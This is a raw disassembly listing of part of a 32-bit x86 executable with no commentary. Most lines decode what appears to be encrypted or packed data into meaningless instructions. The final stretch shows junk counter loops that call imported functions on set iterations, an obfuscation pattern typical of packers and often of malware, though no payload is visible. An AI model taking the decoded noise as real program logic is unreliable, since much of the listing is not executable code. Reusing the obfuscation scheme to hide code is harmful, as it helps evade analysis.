  407193:	sbb    esp,DWORD PTR [esi]
  407195:	scas   eax,DWORD PTR es:[edi]
  407196:	inc    eax
  407197:	push   esp
  407198:	cwde   
  407199:	push   ebx
  40719a:	call   0x5284:0xba2e55cd
  4071a1:	fs out 0x8b,eax
  4071a4:	sbb    eax,0x6e2744c
  4071a9:	xor    DWORD PTR [edi+0x47],ecx
  4071ac:	sbb    ah,BYTE PTR [esi-0x17fc519c]
  4071b2:	or     esp,DWORD PTR [edx+0x78]
  4071b5:	mov    ds:0x9ab6e2db,al
  4071ba:	(bad)  
  4071bb:	push   esi
  4071bc:	cmp    bh,BYTE PTR [edx]
  4071be:	(bad)  
  4071bf:	outs   dx,DWORD PTR ds:[esi]
  4071c0:	mov    ebx,0xb1c48c36
  4071c5:	fnstsw WORD PTR [esi+0x6a]
  4071c8:	push   edx
  4071c9:	shl    BYTE PTR [edx-0x692dc9c0],1
  4071cf:	dec    ecx
  4071d0:	or     esp,DWORD PTR [esi+0xc936af0]
  4071d6:	and    DWORD PTR [ecx-0x52],ebp
  4071d9:	daa    
  4071da:	inc    ebp
  4071db:	mov    cl,0xa9
  4071dd:	pop    ebp
  4071de:	ja     0x407191
  4071e0:	push   es
  4071e1:	ret    
  4071e2:	cs cdq 
  4071e4:	and    al,0xe9
  4071e6:	or     BYTE PTR [ecx-0x58f5cfa9],dh
  4071ec:	test   al,0xa0
  4071ee:	sar    esi,0x39
  4071f1:	xor    BYTE PTR [esi-0x1f],bh
  4071f4:	(bad)
  4071f7:	xchg   edi,eax
  4071f8:	clc    
  4071f9:	pushf  
  4071fa:	iret   
  4071fb:	dec    edi
  4071fc:	and    esp,DWORD PTR [edx+0x39b8070c]
  407202:	xchg   edx,eax
  407203:	and    BYTE PTR [eax+0x237b4034],cl
  407209:	pop    ds
  40720a:	retf   
  40720b:	xchg   ebx,eax
  40720c:	xchg   ebp,eax
  40720d:	or     BYTE PTR [esi+edi*4],dl
  407210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407211:	mov    DWORD PTR [ebp+0x34591809],ebx
  407217:	test   al,0x44
  407219:	and    eax,0xbb645e12
  40721e:	retf   0xb479
  407221:	mov    ?,WORD PTR [ebx]
  407223:	sub    BYTE PTR [edi-0x46cc010f],al
  407229:	adc    bl,BYTE PTR [eax+eiz*2+0x7b4a4eb7]
  407230:	aaa    
  407231:	push   esi
  407232:	xchg   esp,eax
  407233:	aaa    
  407234:	jg     0x40723a
  407236:	push   ebp
  407237:	ins    BYTE PTR es:[edi],dx
  407238:	ret    
  407239:	push   ss
  40723a:	bound  esi,QWORD PTR [eax+0x25]
  40723d:	xlat   BYTE PTR ds:[ebx]
  40723e:	jg     0x4071d5
  407240:	(bad)  
  407241:	inc    edi
  407242:	outs   dx,DWORD PTR ds:[esi]
  407243:	mov    ds:0xaf894d56,eax
  407248:	retf   
  407249:	sbb    ebp,0x18
  40724c:	and    DWORD PTR [edi-0x1751a9c3],eax
  407252:	sahf   
  407253:	xchg   DWORD PTR [ecx+0x2d589f77],eax
  407259:	cmc    
  40725a:	and    dl,dl
  40725c:	out    0xc6,eax
  40725e:	jle    0x407212
  407260:	aaa    
  407261:	push   eax
  407262:	repnz add al,BYTE PTR [edx-0x9]
  407266:	or     ch,BYTE PTR [edi]
  407268:	nop
  407269:	loope  0x4072c0
  40726b:	push   ss
  40726c:	aas    
  40726d:	cdq    
  40726e:	sub    al,0x75
  407270:	outs   dx,BYTE PTR ds:[esi]
  407271:	lods   al,BYTE PTR ds:[esi]
  407272:	adc    esp,DWORD PTR [edi+0x7b22fc20]
  407278:	cmp    eax,0x9ac7af00
  40727d:	stos   BYTE PTR es:[edi],al
  40727e:	lahf   
  40727f:	mov    esi,0x7b3e6bf7
  407284:	pop    edi
  407285:	bound  ecx,QWORD PTR [edi+0x3f3abb8a]
  40728b:	mov    bl,0xbf
  40728d:	(bad)  
  40728e:	inc    esi
  40728f:	(bad)  
  407290:	push   ebx
  407291:	push   ecx
  407292:	mov    DWORD PTR [ecx+esi*1+0x43],ebx
  407296:	(bad)
  407299:	and    eax,0x486556e3
  40729e:	ins    DWORD PTR es:[edi],dx
  40729f:	and    bh,BYTE PTR [ebx+0x793bbc7d]
  4072a5:	data16 (bad) 
  4072a7:	(bad)
  4072ab:	xchg   esp,eax
  4072ac:	adc    edx,edi
  4072ae:	sbb    eax,eax
  4072b0:	add    eax,0x97247f2f
  4072b5:	sub    ch,BYTE PTR [esi-0x70]
  4072b8:	loopne 0x4072e2
  4072ba:	or     BYTE PTR [ebp+0x77],cl
  4072bd:	rcr    DWORD PTR [edi],0xd7
  4072c0:	sbb    BYTE PTR [eax+esi*8+0x25],dh
  4072c4:	or     al,0xc
  4072c6:	fiadd  WORD PTR [edx+edi*1]
  4072c9:	mov    al,es:0xca24ba5e
  4072cf:	mov    ds:0x5c43ac8c,al
  4072d4:	cmp    ebx,edx
  4072d6:	or     ecx,ecx
  4072d8:	leave  
  4072d9:	mov    ds:0x9e4c7df2,eax
  4072de:	leave  
  4072df:	lods   eax,DWORD PTR ds:[esi]
  4072e0:	cmp    bl,dh
  4072e2:	dec    eax
  4072e3:	iret   
  4072e4:	mov    dl,0x58
  4072e6:	xor    DWORD PTR ds:0x6500d356,ebx
  4072ec:	jbe    0x4072d2
  4072ee:	dec    ebx
  4072ef:	outs   dx,DWORD PTR ds:[esi]
  4072f0:	pop    edi
  4072f1:	inc    esp
  4072f2:	jns    0x40727d
  4072f4:	stc    
  4072f5:	mov    BYTE PTR [edi],cl
  4072f7:	add    DWORD PTR [edx],ecx
  4072f9:	loope  0x40735e
  4072fb:	ins    DWORD PTR es:[edi],dx
  4072fc:	pop    edi
  4072fe:	sbb    ax,0xc8e0
  407302:	and    DWORD PTR [esi-0x22436e7f],0x3f5873c0
  40730c:	jmp    0x25d7ec1a
  407311:	xchg   edx,eax
  407312:	and    BYTE PTR [eax+0x8],bl
  407315:	mov    ds:0xb21da305,al
  40731a:	hlt    
  40731b:	arpl   WORD PTR [edi],dx
  40731d:	loop   0x4072c3
  40731f:	lds    edi,FWORD PTR [eax]
  407321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407322:	adc    al,0x83
  407324:	xor    ecx,DWORD PTR [ebx+0x1e]
  407327:	in     eax,0xeb
  407329:	pusha  
  40732a:	out    0xd4,al
  40732c:	fcomip st,st(3)
  40732e:	int    0xbf
  407330:	adc    eax,0xc9580ebf
  407335:	push   edx
  407336:	mov    esi,0xa5a45a69
  40733b:	jge    0x4072e5
  40733d:	inc    esp
  40733e:	adc    eax,0xf811456d
  407343:	pop    es
  407344:	stc    
  407345:	test   al,0xd1
  407347:	or     bh,BYTE PTR [edx]
  407349:	mov    bh,0x6
  40734b:	lahf   
  40734c:	adc    DWORD PTR [esi],ecx
  40734e:	sbb    BYTE PTR [ebx+0x4aa3d3f],0xe2
  407355:	std    
  407356:	and    esi,ebp
  407358:	cmp    al,0x22
  40735a:	push   edx
  40735b:	inc    DWORD PTR [eax-0x20]
  40735e:	jnp    0x407395
  407360:	pop    eax
  407361:	or     BYTE PTR [eax],0xb2
  407364:	js     0x4073d1
  407366:	repnz shl DWORD PTR [bp+0x29],cl
  40736b:	mov    ebx,0xc06587bf
  407370:	mov    al,ds:0x8be40b2
  407375:	xor    BYTE PTR [eax],0x72
  407378:	repz aam 0x32
  40737b:	push   ds
  40737c:	(bad)  
  40737d:	jo     0x4073b6
  40737f:	mov    BYTE PTR [edi-0xc],ah
  407382:	setne  bh
  407385:	inc    ecx
  407386:	pop    edi
  407387:	test   al,0x48
  407389:	rol    BYTE PTR [ecx+ebp*4+0x12574ecd],1
  407390:	jmp    0x23ca904
  407395:	xchg   edi,eax
  407396:	into   
  407397:	pop    esi
  407398:	add    eax,0x89b3f7a9
  40739d:	shr    esi,0xef
  4073a0:	ins    DWORD PTR es:[edi],dx
  4073a1:	and    BYTE PTR [ebp+0x3d456d5],dh
  4073a7:	xchg   edi,eax
  4073a8:	inc    esp
  4073a9:	into   
  4073aa:	fwait
  4073ab:	jb     0x407390
  4073ad:	jge    0x407335
  4073af:	xchg   BYTE PTR [esi+0x1c23f23b],ch
  4073b5:	xor    ecx,DWORD PTR [edi]
  4073b7:	mov    WORD PTR [esi-0x74eeca7d],es
  4073bd:	das    
  4073be:	imul   esp,edi,0x4f
  4073c1:	popf   
  4073c2:	or     BYTE PTR [ecx],0x2e
  4073c5:	psubw  mm6,QWORD PTR ds:0x2f4cdd72
  4073cc:	mov    ?,WORD PTR [ebx+ecx*4+0x19]
  4073d0:	(bad)  
  4073d1:	data16 adc al,0xd8
  4073d4:	xchg   ebp,eax
  4073d5:	or     BYTE PTR [ebx],cl
  4073d7:	iret   
  4073d8:	fmul   QWORD PTR [esi-0x4]
  4073db:	test   al,0x3e
  4073dd:	mov    dh,0x1e
  4073df:	mov    BYTE PTR [esi+0x6ae64fcb],ch
  4073e5:	adc    DWORD PTR [edi-0x6a],edi
  4073e8:	nop
  4073e9:	pop    esi
  4073ea:	jecxz  0x407446
  4073ec:	ins    BYTE PTR es:[edi],dx
  4073ed:	push   esi
  4073ee:	dec    ebx
  4073ef:	fld    TBYTE PTR [esi+0x2c]
  4073f2:	pushf  
  4073f3:	aam    0x76
  4073f5:	(bad)  
  4073f6:	cld    
  4073f7:	cld    
  4073f8:	ss adc al,0xa9
  4073fb:	mov    bl,0x13
  4073fd:	mov    ebx,0x2a1983df
  407402:	nop
  407403:	arpl   WORD PTR [ecx+0x256562cb],bp
  407409:	sub    BYTE PTR [ebx],dh
  40740b:	add    eax,0x8ffe8dce
  407410:	imul   esp,DWORD PTR [edx-0x74],0xfffffff9
  407414:	cli    
  407415:	ins    BYTE PTR es:[edi],dx
  407416:	mov    bh,0x4f
  407418:	mov    bh,0xa8
  40741a:	pop    eax
  40741b:	aad    0x46
  40741d:	add    BYTE PTR ds:0xf5b77f75,0x63
  407424:	cmp    al,BYTE PTR [ebp-0x63]
  407427:	hlt    
  407428:	gs adc ebx,0xffffffaf
  40742c:	mov    al,0x8d
  40742e:	add    BYTE PTR [edx],ah
  407430:	mov    ch,0x25
  407432:	bnd jmp DWORD PTR [edx+0x0]
  407436:	jae    0x407443
  407438:	mov    edx,0xd71a8981
  40743d:	scas   al,BYTE PTR es:[edi]
  40743e:	pop    ds
  40743f:	popa   
  407440:	out    dx,eax
  407441:	not    DWORD PTR [ecx-0x3647ccc9]
  407447:	push   es
  407448:	imul   eax,DWORD PTR [edi],0x11
  40744b:	sub    esi,DWORD PTR [ecx]
  40744d:	inc    eax
  40744e:	mov    ah,0xe6
  407450:	cmp    dh,al
  407452:	xor    BYTE PTR [edi],ah
  407454:	push   edi
  407455:	jns    0x40747f
  407457:	dec    edx
  407458:	mov    DWORD PTR [edx+eax*8],eax
  40745b:	sub    eax,0xc00989f3
  407460:	fldenv [esi]
  407462:	sbb    al,0x9f
  407464:	icebp  
  407465:	in     al,0xf8
  407467:	jp     0x4073ea
  407469:	sti    
  40746a:	inc    edi
  40746b:	xchg   DWORD PTR [edi+0x5b4783fb],edx
  407471:	aaa    
  407472:	out    0xa4,eax
  407474:	adc    edx,DWORD PTR [ebp-0xbfe848f]
  40747a:	int3   
  40747b:	loopne 0x4074e8
  40747d:	dec    edx
  40747e:	mov    ds:0x53d25d71,al
  407483:	mov    DWORD PTR ds:0x433697,0x17
  40748d:	cmp    DWORD PTR ds:0x433697,0x0
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433697,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433697,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433697
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433697,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433697
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433697,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4336ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4336ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	sub    BYTE PTR [eax],ch
  407503:	xor    ebp,DWORD PTR [esi+0x7c7cc856]
  407509:	xlat   BYTE PTR ds:[ebx]
  40750a:	jns    0x407588
  40750c:	jl     0x4074c8
  40750e:	mov    dl,0x9d
  407510:	jne    0x407518
  407512:	out    0x18,al
  407514:	or     cl,bl
  407516:	dec    eax
  407517:	pop    ecx
  407518:	and    al,0x6b
  40751a:	sub    eax,0xb8cbdf76
  40751f:	dec    esp
  407520:	xchg   BYTE PTR [eax],bl
  407522:	xchg   esp,eax
  407523:	into   
  407524:	aas    
  407525:	icebp  
  407526:	push   0x38
  407528:	ret    
  407529:	fimul  WORD PTR [esi+0x72]
  40752c:	jg     0x407554
  40752e:	test   DWORD PTR [edi+0x415184cc],ecx
  407534:	outs   dx,DWORD PTR ds:[esi]
  407535:	shr    BYTE PTR [edi],1
  407537:	or     DWORD PTR [eax-0x2c],ebx
  40753a:	inc    ebp
  40753b:	mov    esp,0x78e1db84
  407540:	mov    bl,0x8a
  407542:	dec    ebp
  407543:	jne    0x4075b5
  407545:	ss shl esp,cl
  407548:	pushf  
  407549:	popa   
  40754a:	imul   esp,ebp,0x45
  40754d:	inc    ecx
  40754e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40754f:	add    al,BYTE PTR ds:0xf2af9ab6
  407555:	jmp    0x2203c29d
  40755a:	repz jge 0x4074e9
  40755d:	or     al,dh
  40755f:	jo     0x407588
  407561:	data16 mov ah,0x59
  407564:	adc    BYTE PTR [esi+0x2fe8a2bd],ch
  40756a:	or     BYTE PTR [edi],ah
  40756c:	(bad)  
  40756d:	jge    0x407547
  40756f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407570:	adc    ch,BYTE PTR [edx]
  407572:	std    
  407573:	mov    ebx,DWORD PTR [edi+0x736039b4]
  407579:	cli    
  40757a:	rol    ch,cl
  40757c:	cmp    ecx,0xffffff96
  40757f:	push   cs
  407580:	in     al,0xad
  407582:	mov    BYTE PTR [ebp+0x29],bl
  407585:	cmp    al,0x3a
  407587:	imul   esp,DWORD PTR [esp+esi*2],0xa9216df4
  40758e:	xchg   esp,eax
  40758f:	push   esi
  407590:	push   eax
  407591:	xor    DWORD PTR [si-0x780a],ebp
  407596:	sti    
  407597:	test   eax,0xef90ba31
  40759c:	xlat   BYTE PTR ds:[ebx]
  40759d:	sub    cl,BYTE PTR ds:0x5783fe2e
  4075a3:	xchg   BYTE PTR [edi+0xa853e2f],ch
  4075a9:	inc    ecx
  4075aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ab:	fst    st(1)
  4075ad:	das    
  4075ae:	mov    ebp,0x43bf6673
  4075b3:	fsubr  st,st(5)
  4075b5:	hlt    
  4075b6:	dec    ebx
  4075b7:	push   esi
  4075b8:	pop    edi
  4075b9:	sub    eax,0xfea1f62
  4075be:	fldenv [edx+0x2f]
  4075c1:	ret    
  4075c2:	jae    0x4075e8
  4075c4:	jg     0x407562
  4075c6:	mov    eax,ds:0x5fe04c95
  4075cb:	cwde   
  4075cc:	loop   0x4075ea
  4075ce:	test   eax,0x1cdece41
  4075d3:	out    dx,eax
  4075d4:	and    eax,0x44376f26
  4075d9:	mov    al,ds:0xbdb43456
  4075de:	xor    ecx,DWORD PTR [eax]
  4075e0:	sub    bl,BYTE PTR [esp+edx*2]
  4075e3:	test   BYTE PTR [esi],ch
  4075e5:	test   al,0x6b
  4075e7:	in     al,dx
  4075e8:	pop    ebp
  4075e9:	or     al,0xe6
  4075eb:	ds mov bl,0xb0
  4075ee:	inc    ebx
  4075ef:	inc    edx
  4075f0:	mov    esp,0xa16cfcde
  4075f5:	push   0xffffff8c
  4075f7:	outs   dx,DWORD PTR ds:[esi]
  4075f8:	push   ebx
  4075f9:	cmp    eax,0x61912a9d
  4075fe:	jne    0x4075b4
  407600:	dec    edx
  407601:	jb     0x407583
  407603:	or     ch,BYTE PTR [ecx+0x7ea91b0e]
  407609:	int    0xd8
  40760b:	retf   0xe42d
  40760e:	lea    ecx,[edx-0x17]
  407611:	loopne 0x407681
  407613:	mov    BYTE PTR [ebx],0x85
  407616:	jns    0x407619
  407618:	pop    ebx
  407619:	shl    DWORD PTR [ebp+0x6a],cl
  40761c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40761d:	mov    esp,0xe792b5c1
  407622:	sub    ebp,DWORD PTR [ebx+0x1a]
  407625:	or     DWORD PTR [ebp-0x43],esi
  407628:	je     0x407678
  40762a:	mov    ebx,0x9cd9c4a5
  40762f:	xchg   al,cl
  407631:	repnz lea eax,[eax]
  407634:	cmp    al,0x71
  407636:	retf   0xf9fd
  407639:	into   
  40763a:	jecxz  0x407606
  40763c:	xchg   edx,eax
  40763d:	les    esi,FWORD PTR ds:0x22cb11e7
  407643:	push   ds
  407644:	sti    
  407645:	xor    BYTE PTR [ecx+0x56],bl
  407648:	pop    ebx
  407649:	push   eax
  40764a:	xchg   esi,eax
  40764b:	ja     0x407654
  40764d:	xchg   edi,eax
  40764e:	sbb    cl,bl
  407650:	pusha  
  407651:	mov    edx,0xd3ccee94
  407656:	jmp    0x65e9e151
  40765b:	int    0xb2
  40765d:	adc    cl,0xa1
  407660:	out    0x1b,eax
  407662:	out    dx,eax
  407663:	ins    DWORD PTR es:[edi],dx
  407664:	jno    0x407629
  407666:	sbb    bl,BYTE PTR [ebx+0xf]
  407669:	rcr    BYTE PTR [esi],cl
  40766b:	test   DWORD PTR [edx+0x16],ecx
  40766e:	out    dx,al
  40766f:	icebp  
  407670:	push   0xf8630e14
  407675:	sbb    al,0x14
  407677:	repnz nop
  407679:	icebp  
  40767a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767b:	push   ebx
  40767c:	dec    eax
  40767d:	mov    cl,0xcb
  40767f:	dec    esp
  407680:	es jmp 0xbce0f710
  407686:	sub    al,BYTE PTR [ebp+0x35]
  407689:	int    0x92
  40768b:	cli    
  40768c:	in     eax,0x55
  40768e:	mov    ds:0x3f4be566,al
  407693:	jno    0x4076a4
  407695:	mov    WORD PTR [esi+ebx*1],?
  407698:	push   ebp
  407699:	xchg   ebp,eax
  40769a:	pop    ebp
  40769b:	dec    eax
  40769c:	popa   
  40769d:	(bad)  
  40769e:	adc    dh,BYTE PTR [ecx]
  4076a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076a1:	xlat   BYTE PTR ds:[ebx]
  4076a2:	(bad)  
  4076a3:	call   0x216679f9
  4076a8:	adc    DWORD PTR [ecx+0x23],ebp
  4076ab:	mov    bl,0x95
  4076ad:	jb     0x4076b2
  4076af:	sbb    ebp,edx
  4076b1:	jmp    0xddaf2bc8
  4076b6:	nop
  4076b7:	rcr    BYTE PTR [ebp+eiz*8+0x1a7a77d0],cl
  4076be:	lods   eax,DWORD PTR ds:[esi]
  4076bf:	jb     0x407644
  4076c1:	ja     0x407702
  4076c3:	mov    DWORD PTR [edi],esp
  4076c5:	pop    es
  4076c6:	or     eax,0x4d6d830
  4076cb:	xor    al,0x21
  4076cd:	bound  ebp,QWORD PTR [esi-0x35fb745b]
  4076d3:	sbb    dl,BYTE PTR cs:[ebx-0x5715d2ee]
  4076da:	dec    edx
  4076db:	adc    al,0x62
  4076dd:	pop    ecx
  4076de:	add    DWORD PTR [ebx],esp
  4076e0:	sti    
  4076e1:	push   0x3f78d608
  4076e6:	int3   
  4076e7:	jmp    0x41fadc0c
  4076ec:	xor    bh,ah
  4076ee:	adc    ebp,DWORD PTR [edi-0x4c295369]
  4076f4:	stos   BYTE PTR es:[edi],al
  4076f5:	pop    ds
  4076f6:	ds (bad) 
  4076f8:	lods   eax,DWORD PTR ds:[esi]
  4076f9:	pop    ds
  4076fa:	xchg   ah,ah
  4076fc:	xor    BYTE PTR [ecx],bh
  4076fe:	std    
  4076ff:	jmp    0x6415d975
  407704:	or     DWORD PTR [ebx+0x70],edi
  407707:	in     eax,dx
  407708:	and    DWORD PTR [ecx+edi*8],ebp
  40770b:	jae    0x40771c
  40770d:	jle    0x407781
  40770f:	and    ebx,DWORD PTR [esi]
  407711:	jb     0x40775a
  407713:	shl    DWORD PTR [esi+0x43bfbfd0],0x8
  40771a:	inc    edi
  40771b:	aas    
  40771c:	and    dl,BYTE PTR [ebx]
  40771e:	dec    edx
  407720:	fsubr  QWORD PTR [eax]
  407722:	mov    cl,0xe2
  407724:	in     eax,0x68
  407726:	sub    BYTE PTR [esi+0x7c],ch
  407729:	popf   
  40772a:	push   edx
  40772b:	and    dl,BYTE PTR [ebx+0x4f]
  40772e:	ret    0xc62f
  407731:	sub    DWORD PTR [esi],edx
  407733:	jnp    0x40772b
  407735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407737:	cld    
  407738:	retf   
  407739:	or     BYTE PTR [edx+0x2ac1172c],bl
  40773f:	mov    edx,0xb6d9c6b7
  407744:	jge    0x4076d3
  407746:	dec    ebx
  407747:	cmp    DWORD PTR [eax-0x62],eax
  40774a:	outs   dx,DWORD PTR ds:[esi]
  40774b:	jo     0x4077ca
  40774d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40774e:	push   cs
  40774f:	out    dx,eax
  407750:	int    0x1
  407752:	sub    ch,bh
  407754:	repnz fnstenv [edi+0x21]
  407758:	out    0x4b,al
  40775a:	out    dx,al
  40775b:	fdiv   DWORD PTR [esi+esi*4-0x3c]
  40775f:	or     ah,BYTE PTR ds:0xf53778cd
  407765:	int3   
  407766:	adc    DWORD PTR [ecx+0x35fa985f],0x48
  40776d:	or     al,0xe9
  40776f:	adc    al,ah
  407771:	loopne 0x407771
  407773:	pop    ebp
  407774:	das    
  407775:	call   0x3140541f
  40777a:	xchg   esi,eax
  40777b:	and    DWORD PTR [eax+0x3],eax
  40777e:	out    dx,al
  40777f:	jns    0x407708
  407781:	sub    BYTE PTR fs:[esi+0x33],dh
  407785:	adc    ch,BYTE PTR [ebp+0x68]
  407788:	push   eax
  407789:	retf   0x8a05
  40778c:	xor    BYTE PTR [edx+0x4ab27d18],dh
  407792:	fsub   DWORD PTR [eax]
  407794:	enter  0x2be2,0x34
  407798:	aas    
  407799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40779a:	sub    al,0xc9
  40779c:	lods   eax,DWORD PTR ds:[esi]
  40779d:	inc    eax
  40779e:	add    ebp,0xffffff92
  4077a1:	xchg   ecx,eax
  4077a2:	push   edx
  4077a3:	mov    ch,ah
  4077a5:	aas    
  4077a6:	outs   dx,DWORD PTR ds:[esi]
  4077a7:	xor    BYTE PTR [ebp-0x16],dh
  4077aa:	arpl   WORD PTR [edi+0xecb73a7],di
  4077b0:	pushf  
  4077b1:	clc    
  4077b2:	dec    esi
  4077b3:	and    eax,0x157cb36
  4077b8:	xchg   ebp,eax
  4077b9:	push   ecx
  4077ba:	fcom   QWORD PTR [edx+0x7d63fa10]
  4077c0:	and    al,0xa3
  4077c2:	psubq  mm3,mm4
  4077c5:	fist   WORD PTR [esi]
  4077c7:	sahf   
  4077c8:	adc    ebp,esi
  4077ca:	loop   0x4077e3
  4077cc:	mov    ah,ah
  4077ce:	hlt    
  4077cf:	aaa    
  4077d0:	call   0x90332664
  4077d5:	aas    
  4077d6:	iret   
  4077d7:	push   ecx
  4077d8:	mov    ds:0x81fa4979,al
  4077dd:	sub    al,BYTE PTR [ebp+0x59]
  4077e0:	mov    bl,0xdc
  4077e2:	inc    eax
  4077e3:	mov    WORD PTR [ebx+0x63],ss
  4077e6:	add    al,0x75
  4077e8:	arpl   WORD PTR [ecx-0x2e42a590],di
  4077ee:	bound  esp,QWORD PTR ds:0x92ef826a
  4077f4:	mov    eax,ds:0xf5534609
  4077f9:	lahf   
  4077fa:	dec    eax
  4077fb:	ins    DWORD PTR es:[edi],dx
  4077fc:	daa    
  4077fd:	pop    esp
  4077fe:	sar    BYTE PTR [esp+edi*4+0x57c83659],1
  407805:	add    dl,al
  407807:	daa    
  407808:	retf   
  407809:	fs or  al,0x3b
  40780c:	fcomp  QWORD PTR [edx-0x38]
  40780f:	sub    eax,0xa0d8ff7e
  407814:	gs pop es
  407816:	loop   0x4077e7
  407818:	and    DWORD PTR [ecx-0x79],edx
  40781b:	dec    ebp
  40781c:	push   ecx
  40781d:	sbb    ah,bl
  40781f:	sbb    al,0x5c
  407821:	add    bh,BYTE PTR [ebx-0x3e]
  407824:	mov    ah,0x11
  407826:	call   0xeaaa5a69
  40782b:	ja     0x407875
  40782d:	or     eax,0xd81b1e03
  407832:	or     eax,0xb421b14f
  407837:	bound  edx,QWORD PTR cs:[ecx+0xa7d7a45]
  40783e:	inc    edi
  40783f:	arpl   ax,ax
  407841:	mov    bl,0xb3
  407843:	and    eax,edi
  407845:	xchg   edi,eax
  407846:	jp     0x407863
  407848:	mov    ds:0x2a045b69,al
  40784d:	outs   dx,DWORD PTR ds:[esi]
  40784e:	outs   dx,BYTE PTR ds:[esi]
  40784f:	jp     0x407853
  407851:	retf   
  407852:	mov    eax,ds:0x46d004ef
  407857:	int3   
  407858:	and    DWORD PTR [ebx+0x7b],0x62ade211
  40785f:	cdq    
  407860:	call   0xac8b54a
  407865:	aaa    
  407866:	mov    eax,DWORD PTR [ebp-0x1c]
  407869:	and    DWORD PTR ds:0x433717,0x0
  407873:	mov    ebx,DWORD PTR ds:0x433717
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433717,ebx
  407880:	cmp    DWORD PTR ds:0x433717,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433717,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433717
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433717,ebx
  4078b0:	cmp    DWORD PTR ds:0x433717,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43364b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4336eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4336eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4336eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4336eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4336eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433914
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4336eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4336eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4336eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43364b,0x19
  407943:	cmp    DWORD PTR ds:0x43364b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43364b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43364b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43364b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43364b,edi
  407988:	mov    edi,DWORD PTR ds:0x43364b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43364b,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4336ef
  4079a2:	or     edi,DWORD PTR ds:0x433763
  4079a8:	mov    DWORD PTR ds:0x4336ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4336b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4336b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4336b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4336b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4336b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
